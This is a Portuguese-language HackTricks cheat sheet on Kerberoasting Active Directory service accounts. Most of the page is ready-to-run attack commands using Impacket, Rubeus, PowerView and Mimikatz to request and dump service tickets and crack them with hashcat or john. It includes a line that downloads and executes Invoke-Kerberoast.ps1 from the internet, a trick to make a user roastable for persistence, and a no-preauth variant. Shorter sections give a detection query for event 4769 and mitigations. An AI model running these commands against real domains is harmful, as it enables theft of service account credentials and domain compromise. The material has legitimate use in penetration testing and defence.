# Kerberoast

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) para construir e **automatizar fluxos de trabalho** facilmente, impulsionados pelas **ferramentas comunitárias mais avançadas** do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting foca na aquisição de **TGS tickets**, especificamente aqueles relacionados a serviços operando sob **contas de usuário** no **Active Directory (AD)**, excluindo **contas de computador**. A criptografia desses tickets utiliza chaves que se originam de **senhas de usuário**, permitindo a possibilidade de **cracking de credenciais offline**. O uso de uma conta de usuário como serviço é indicado por uma propriedade **"ServicePrincipalName"** não vazia.

Para executar **Kerberoasting**, é essencial uma conta de domínio capaz de solicitar **TGS tickets**; no entanto, esse processo não exige **privilégios especiais**, tornando-o acessível a qualquer um com **credenciais de domínio válidas**.

### Pontos Chave:

- **Kerberoasting** visa **TGS tickets** para **serviços de conta de usuário** dentro do **AD**.
- Tickets criptografados com chaves de **senhas de usuário** podem ser **crackeados offline**.
- Um serviço é identificado por um **ServicePrincipalName** que não é nulo.
- **Nenhum privilégio especial** é necessário, apenas **credenciais de domínio válidas**.

### **Ataque**

> [!WARNING]
> **Ferramentas de Kerberoasting** normalmente solicitam **`RC4 encryption`** ao realizar o ataque e iniciar solicitações TGS-REQ. Isso ocorre porque **RC4 é** [**mais fraco**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) e mais fácil de crackear offline usando ferramentas como Hashcat do que outros algoritmos de criptografia, como AES-128 e AES-256.\
> Hashes RC4 (tipo 23) começam com **`$krb5tgs$23$*`** enquanto AES-256 (tipo 18) começam com **`$krb5tgs$18$*`**.`

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Ferramentas multifuncionais, incluindo um dump de usuários kerberoastable:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

- **Enumerar usuários Kerberoastable**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
- **Técnica 1: Solicitar TGS e despejá-lo da memória**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
- **Técnica 2: Ferramentas automáticas**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
> [!WARNING]
> Quando um TGS é solicitado, o evento do Windows `4769 - Um ticket de serviço Kerberos foi solicitado` é gerado.

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) para construir e **automatizar fluxos de trabalho** facilmente, impulsionados pelas **ferramentas** da comunidade **mais avançadas** do mundo.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

### Quebra
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistência

Se você tiver **permissões suficientes** sobre um usuário, você pode **torná-lo kerberoastable**:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Você pode encontrar **ferramentas** úteis para ataques de **kerberoast** aqui: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Se você encontrar este **erro** do Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** é por causa do seu horário local, você precisa sincronizar o host com o DC. Existem algumas opções:

- `ntpdate <IP do DC>` - Obsoleto a partir do Ubuntu 16.04
- `rdate -n <IP do DC>`

### Mitigação

Kerberoasting pode ser realizado com um alto grau de furtividade se for explorável. Para detectar essa atividade, deve-se prestar atenção ao **ID de Evento de Segurança 4769**, que indica que um ticket Kerberos foi solicitado. No entanto, devido à alta frequência deste evento, filtros específicos devem ser aplicados para isolar atividades suspeitas:

- O nome do serviço não deve ser **krbtgt**, pois este é um pedido normal.
- Nomes de serviços que terminam com **$** devem ser excluídos para evitar incluir contas de máquina usadas para serviços.
- Solicitações de máquinas devem ser filtradas excluindo nomes de contas formatados como **machine@domain**.
- Apenas solicitações de ticket bem-sucedidas devem ser consideradas, identificadas por um código de falha de **'0x0'**.
- **Mais importante**, o tipo de criptografia do ticket deve ser **0x17**, que é frequentemente usado em ataques de Kerberoasting.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Para mitigar o risco de Kerberoasting:

- Assegure que **Senhas de Contas de Serviço sejam difíceis de adivinhar**, recomendando um comprimento de mais de **25 caracteres**.
- Utilize **Contas de Serviço Gerenciadas**, que oferecem benefícios como **mudanças automáticas de senha** e **Gerenciamento Delegado de Nome Principal de Serviço (SPN)**, aumentando a segurança contra tais ataques.

Ao implementar essas medidas, as organizações podem reduzir significativamente o risco associado ao Kerberoasting.

## Kerberoast sem conta de domínio

Em **setembro de 2022**, uma nova forma de explorar um sistema foi revelada por um pesquisador chamado Charlie Clark, compartilhada através de sua plataforma [exploit.ph](https://exploit.ph/). Este método permite a aquisição de **Tickets de Serviço (ST)** via uma solicitação **KRB_AS_REQ**, que notavelmente não requer controle sobre nenhuma conta do Active Directory. Essencialmente, se um principal estiver configurado de tal forma que não exija pré-autenticação—um cenário semelhante ao que é conhecido no campo da cibersegurança como um ataque **AS-REP Roasting**—essa característica pode ser aproveitada para manipular o processo de solicitação. Especificamente, ao alterar o atributo **sname** dentro do corpo da solicitação, o sistema é enganado para emitir um **ST** em vez do padrão Ticket Granting Ticket (TGT) criptografado.

A técnica é totalmente explicada neste artigo: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

> [!WARNING]
> Você deve fornecer uma lista de usuários porque não temos uma conta válida para consultar o LDAP usando esta técnica.

#### Linux

- [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

- [GhostPack/Rubeus do PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Referências

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) para construir e **automatizar fluxos de trabalho** facilmente, impulsionados pelas **ferramentas** comunitárias **mais avançadas** do mundo.\
Acesse hoje: 

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
